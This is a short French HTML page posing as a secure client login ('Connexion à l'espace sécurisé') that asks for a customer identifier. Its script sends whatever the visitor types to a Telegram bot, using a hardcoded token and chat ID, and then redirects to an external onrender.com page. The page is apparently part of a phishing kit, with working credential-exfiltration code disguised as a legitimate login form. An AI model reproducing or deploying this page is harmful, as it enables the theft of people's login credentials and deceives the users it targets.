<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion Client</title>
</head>
<body style="font-family: Arial; text-align: center; padding-top: 100px;">
  <h2>Connexion à l'espace sécurisé</h2>
  <form id="loginForm">
    <input type="text" id="identifiant" placeholder="Identifiant client" required />
    <br><br>
    <button type="submit">Suivant</button>
  </form>

  <script>
    const TELEGRAM_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A';
    const CHAT_ID = '6297861735';

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const identifiant = document.getElementById('identifiant').value;

      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `Nouvelle connexion: ${identifiant}`
        })
      }).then(() => {
        window.location.href = 'https://code-s-curit.onrender.com';
      });
    });
  </script>
</body>
</html>
